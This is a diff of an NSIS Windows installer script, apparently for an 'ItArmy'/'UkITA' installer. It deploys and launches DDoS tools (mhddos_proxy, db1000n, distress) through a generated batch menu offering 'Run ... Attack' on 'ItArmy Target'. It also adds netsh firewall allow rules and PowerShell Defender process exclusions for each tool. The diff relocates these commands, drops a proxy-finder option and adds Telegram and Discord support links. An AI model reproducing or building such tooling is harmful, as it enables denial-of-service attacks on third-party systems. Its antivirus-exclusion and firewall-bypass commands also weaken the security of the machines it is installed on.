@@ -69,8 +69,8 @@ Section
   WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayName" "${PRODUCT}"
   WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "UninstallString" '"$INSTDIR\${UNINSTALLER_NAME}.exe"'
   WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayIcon" '"$INSTDIR\itarmy.ico",0'
-  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "Publisher" "UA ItArmy Installer"
-  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "URLInfoAbout" "https://github.com/OleksandrBlack/uaitarmy_installer"
+  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "Publisher" "UkITA Installer"
+  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "URLInfoAbout" "https://github.com/OleksandrBlack/ukita_installer"
   WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "DisplayVersion" "${PRODUCT_VERSION}"
   WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoModify" 1
   WriteRegDWORD HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\${PRODUCT}" "NoRepair" 1
@@ -88,39 +88,12 @@ Section
 SectionEnd
 
 Section
-	;Add firewall&&defender rule
-	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_in" dir=in action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
-	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_in" dir=in action=allow program="${GIT_DIR}\git.exe" enable=yes"'
-	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_in" dir=in action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
-	${If} ${RunningX64}
-		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_in" dir=in action=allow program="${DISTRESS_DIR}\distress_x86_64-pc-windows-msvc.exe" enable=yes"'
-	${Else}
-		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_in" dir=in action=allow program="${DISTRESS_DIR}\distress_i686-pc-windows-msvc.exe" enable=yes"'
-	${EndIf}
-	
-	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_out" dir=out action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
-	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_out" dir=out action=allow program="${GIT_DIR}\git.exe" enable=yes"'
-	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_out" dir=out action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
-	${If} ${RunningX64}
-		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_out" dir=out action=allow program="${DISTRESS_DIR}\distress_x86_64-pc-windows-msvc.exe" enable=yes"'
-	${Else}
-		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_out" dir=out action=allow program="${DISTRESS_DIR}\distress_i686-pc-windows-msvc.exe" enable=yes"'
-	${EndIf}
-	
-	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "python.exe""'
-	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "git.exe""'
-	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "db1000n.exe""'
-	${If} ${RunningX64}
-		nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "distress_x86_64-pc-windows-msvc.exe""'
-	${Else}
-		nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "distress_i686-pc-windows-msvc.exe""'
-	${EndIf}
-	
-SectionEnd
-
-Section
 	SectionIn RO
 	SetOutPath ${GIT_DIR}
+	
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_in" dir=in action=allow program="${GIT_DIR}\git.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_git_out" dir=out action=allow program="${GIT_DIR}\git.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "git.exe""'
 
 	File /r "requirements\git\*"
 SectionEnd
@@ -128,6 +101,10 @@ SectionEnd
 Section
 	SectionIn RO
 	SetOutPath ${PYTHON_DIR}
+	
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_in" dir=in action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_python_out" dir=out action=allow program="${PYTHON_DIR}\python.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "python.exe""'
  
 	${If} ${RunningX64}
 		File /r "requirements\python\x64\*"
@@ -153,32 +130,20 @@ Section ;RUNNER
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_powerfull' goto ITARMY_POWERFULL)$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_db1000n' goto ITARMY_DB1000N)$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_distress' goto ITARMY_DISTRESS)$\r$\n"
-  ;FileWrite $9 ":RUN_MHDDOS_PROXY_BETA$\r$\n"
-  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-itarmy_beta' goto ITARMY_BETA)$\r$\n"
+
   FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY$\r$\n"
   FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy' goto CLONE_MHDDOS_PROXY)$\r$\n"
-  ;FileWrite $9 ":RUN_CLONE_MHDDOS_PROXY_BETA$\r$\n"
-  ;FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_mhddos_proxy_beta' goto CLONE_MHDDOS_PROXY_BETA)$\r$\n"
-  
-  FileWrite $9 ":run_clone_proxy_finder$\r$\n"
-  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-clone_proxy_finder' goto clone_proxy_finder)$\r$\n"
-  FileWrite $9 ":run_proxy_finder$\r$\n"
-  FileWrite $9 "FOR %%A IN (%*) DO (IF '%%A'=='-proxy_finder' goto proxy_finder)$\r$\n"
   
   FileWrite $9 ":MAIN_INFO$\r$\n"
   FileWrite $9 "ECHO.$\r$\n"
   FileWrite $9 "ECHO 1. Run MHDDOS_PROXY Attack$\r$\n"
   FileWrite $9 "ECHO 2. Run DB1000N Attack$\r$\n"
   FileWrite $9 "ECHO 3. Run DSTREES Attack$\r$\n"
-  FileWrite $9 "ECHO 4. Run proxy_finder$\r$\n"
-  ;FileWrite $9 "ECHO 2. Run ItArmy Attack BETA$\r$\n"
   FileWrite $9 "set /p choice=Enter a number to start the action:$\r$\n"
   FileWrite $9 "if '%choice%'=='' ECHO '%choice%'  is not a valid option, please try again$\r$\n"
   FileWrite $9 "if '%choice%'=='1' goto ITARMY$\r$\n"
   FileWrite $9 "if '%choice%'=='2' goto ITARMY_DB1000N$\r$\n"
   FileWrite $9 "if '%choice%'=='3' goto ITARMY_DISTRESS$\r$\n"
-  FileWrite $9 "if '%choice%'=='4' goto proxy_finder$\r$\n"
-  ;FileWrite $9 "if '%choice%'=='2' goto ITARMY_BETA$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
   FileWrite $9 ":CLONE_MHDDOS_PROXY$\r$\n"
@@ -191,14 +156,6 @@ Section ;RUNNER
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
-  ;FileWrite $9 ":CLONE_MHDDOS_PROXY_BETA$\r$\n"
-  ;FileWrite $9 "CD $INSTDIR$\r$\n"
-  ;FileWrite $9 "git clone -b feature-async ${MHDDOS_PROXY_SRC} ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  ;FileWrite $9 "git pull$\r$\n"
-  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  ;FileWrite $9 "goto END$\r$\n"
-  
   FileWrite $9 ":ITARMY$\r$\n"
   FileWrite $9 "CD ${MHDDOS_PROXY_DIR}$\r$\n"
   FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
@@ -207,7 +164,7 @@ Section ;RUNNER
   FileWrite $9 "ECHO Cheack requirements$\r$\n"
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Start Attack ItArmy Target$\r$\n"
+  FileWrite $9 "ECHO Start MHDDOS_PROXY Attack ItArmy Target$\r$\n"
   FileWrite $9 "python runner.py $(mhddos_lang) --itarmy$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
@@ -219,7 +176,7 @@ Section ;RUNNER
   FileWrite $9 "ECHO Cheack requirements$\r$\n"
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
   FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Start Attack ItArmy Target$\r$\n"
+  FileWrite $9 "ECHO Start MHDDOS_PROXY_POWERFULL Attack ItArmy Target$\r$\n"
   FileWrite $9 "python runner.py $(mhddos_lang) --itarmy --copies auto$\r$\n"
   FileWrite $9 "goto END$\r$\n"
   
@@ -239,36 +196,12 @@ Section ;RUNNER
   ${EndIf}
   FileWrite $9 "goto END$\r$\n"
   
-  ;FileWrite $9 ":ITARMY_BETA$\r$\n"
-  ;FileWrite $9 "CD ${MHDDOS_PROXY_BETA_DIR}$\r$\n"
-  ;FileWrite $9 "ECHO Cheack Update mhddos_proxy$\r$\n"
-  ;FileWrite $9 "git pull$\r$\n"
-  ;FileWrite $9 "ECHO OK$\r$\n"
-  ;FileWrite $9 "ECHO Cheack requirements$\r$\n"
-  ;FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  ;FileWrite $9 "ECHO OK$\r$\n"
-  ;FileWrite $9 "ECHO Start Attack ItArmy Target BETA$\r$\n"
-  ;FileWrite $9 "python runner.py $(mhddos_lang) --itarmy$\r$\n"
-  ;FileWrite $9 "goto END$\r$\n"
-  
   FileWrite $9 ":clone_proxy_finder$\r$\n"
   FileWrite $9 "CD $INSTDIR$\r$\n"
   FileWrite $9 "git clone ${proxy_finder_src} ${proxy_finder_dir}$\r$\n"
   FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
   FileWrite $9 "git pull$\r$\n"
   FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "goto END$\r$\n"
-  
-  FileWrite $9 ":proxy_finder$\r$\n"
-  FileWrite $9 "CD ${proxy_finder_dir}$\r$\n"
-  FileWrite $9 "ECHO Cheack Update proxy_finder$\r$\n"
-  FileWrite $9 "git pull$\r$\n"
-  FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Cheack requirements$\r$\n"
-  FileWrite $9 "python -m pip install -r requirements.txt$\r$\n"
-  FileWrite $9 "ECHO OK$\r$\n"
-  FileWrite $9 "ECHO Start Proxy Finder (ItArmy)$\r$\n"
-  FileWrite $9 "python finder.py$\r$\n"
   FileWrite $9 "goto END$\r$\n"
 
   FileWrite $9 ":END$\r$\n"
@@ -283,9 +216,7 @@ Section	"mhddos_proxy";INSTALL MHDDOS_PROXY
   
   File "resources\itarmy_mhddos.ico"
   File "resources\itarmy_mhddos_powerfull.ico"
-  File "resources\itarmy_d1000n.ico"
-  File "resources\itarmy_distress.ico"
-  
+   
   CreateShortCut "$DESKTOP\MHDDOS_PROXY.lnk" "$INSTDIR\runner.bat" "-itarmy" "$INSTDIR\itarmy_mhddos.ico" 0
   CreateShortCut "$DESKTOP\MHDDOS_PROXY_POWERFULL.lnk" "$INSTDIR\runner.bat" "-itarmy_powerfull" "$INSTDIR\itarmy_mhddos_powerfull.ico" 0
 
@@ -293,6 +224,12 @@ SectionEnd
 
 Section	"db1000n"
 	SetOutPath ${DB1000N_DIR}
+	
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_in" dir=in action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_db1000n_out" dir=out action=allow program="${DB1000N_DIR}\db1000n.exe" enable=yes"'
+	nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "db1000n.exe""'
+	
+	File "resources\itarmy_d1000n.ico"
 
 	${If} ${RunningX64}
 		File /r "requirements\db1000n\x64\*"
@@ -300,12 +237,24 @@ Section	"db1000n"
 		File /r "requirements\db1000n\x86\*"
 	${EndIf}  
  
-	CreateShortCut "$DESKTOP\DB1000N.lnk" "$INSTDIR\runner.bat" "-itarmy_db1000n" "$INSTDIR\itarmy_d1000n.ico" 0
+	CreateShortCut "$DESKTOP\DB1000N.lnk" "$INSTDIR\runner.bat" "-itarmy_db1000n" "${DB1000N_DIR}\itarmy_d1000n.ico" 0
 
 SectionEnd
 
 Section	"distress"
 	SetOutPath ${DISTRESS_DIR}
+	
+	${If} ${RunningX64}
+		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_in" dir=in action=allow program="${DISTRESS_DIR}\distress_x86_64-pc-windows-msvc.exe" enable=yes"'
+		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_out" dir=out action=allow program="${DISTRESS_DIR}\distress_x86_64-pc-windows-msvc.exe" enable=yes"'
+		nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "distress_x86_64-pc-windows-msvc.exe""'
+	${Else}
+		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_in" dir=in action=allow program="${DISTRESS_DIR}\distress_i686-pc-windows-msvc.exe" enable=yes"'
+		nsExec::Exec 'cmd /c "netsh advfirewall firewall add rule name="itarmy_distress_out" dir=out action=allow program="${DISTRESS_DIR}\distress_i686-pc-windows-msvc.exe" enable=yes"'
+		nsExec::Exec 'cmd /c "powershell -exec bypass -Command Add-MpPreference -ExclusionProcess "distress_i686-pc-windows-msvc.exe""'
+	${EndIf}
+	
+	File "resources\itarmy_distress.ico"
 
 	${If} ${RunningX64}
 		File /r "requirements\distress\x64\*"
@@ -313,43 +262,10 @@ Section	"distress"
 		File /r "requirements\distress\x86\*"
 	${EndIf}  
  
-	CreateShortCut "$DESKTOP\DISTRESS.lnk" "$INSTDIR\runner.bat" "-itarmy_distress" "$INSTDIR\itarmy_distress.ico" 0
+	CreateShortCut "$DESKTOP\DISTRESS.lnk" "$INSTDIR\runner.bat" "-itarmy_distress" "${DISTRESS_DIR}\itarmy_distress.ico" 0
 
 SectionEnd
-;Section	"mhddos_proxy_beta (feature-async)";INSTALL MHDDOS_PROXY_BETA
-;  SectionIn RO
-;  SetOutPath $INSTDIR
-; 
-;  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_mhddos_proxy_beta"'
-;  
-;SectionEnd
 
-;ItArmy
-
-
-;ItArmy BETA
-;Section	/o	$(inst_itarmy_beta_req) ;"ItArmy of Ukraine Attack BETA"
-;
-;  SetOutPath $INSTDIR
-;  
-;  File "resources\itarmy_beta.ico"
-;  
-;  CreateShortCut "$DESKTOP\$(inst_itarmy_beta_req).lnk" "$INSTDIR\runner.bat" "-itarmy_beta" "$INSTDIR\itarmy_beta.ico" 0
-;
-;SectionEnd
-
-;Proxy Finder
-Section	/o	$(inst_pf_req)
-
-  SetOutPath $INSTDIR
-  
-  File "resources\itarmy_proxy.ico"
-  
-  nsExec::Exec 'cmd /c "$INSTDIR\runner.bat -clone_proxy_finder"'
-  
-  CreateShortCut "$DESKTOP\PROXY_FINDER.lnk" "$INSTDIR\runner.bat" "-proxy_finder" "$INSTDIR\itarmy_proxy.ico" 0
-
-SectionEnd
 
 Function .onInit
 
@@ -369,5 +285,42 @@ Function .onInit
   Quit
 
   done:
+
+FunctionEnd
+
+var TelegramCheckbox
+var DiscordCheckbox
+
+Function ShowFinishCheckbox
+${NSD_CreateCheckbox} 125u 175u 100u 15u "Open Telegram Support"
+Pop $TelegramCheckbox
+SetCtlColors $TelegramCheckbox "" "ffffff"
+
+${NSD_CreateCheckbox} 225u 175u 100u 15u "Open Discord Support"
+Pop $DiscordCheckbox
+SetCtlColors $DiscordCheckbox "" "ffffff"
+FunctionEnd
+
+Function OpenFinishLink
+${NSD_GetState} $TelegramCheckbox $0
+${If} $0 <> 0
+    ExecShell "open" "https://t.me/itarmyofukraine2022"
+${EndIf}
+
+${NSD_GetState} $DiscordCheckbox $0
+${If} $0 <> 0
+    ExecShell "open" "https://discord.gg/rWTNk3UR"
+${EndIf}
+FunctionEnd
+
+
+
+;--------------------------------
+;After Installation Function
+
+Function .onInstSuccess
+
+  ;Open 'Thank you for installing' site or something else
+  ;ExecShell "open" "https://t.me/itarmyofukraine2022"
 
 FunctionEnd
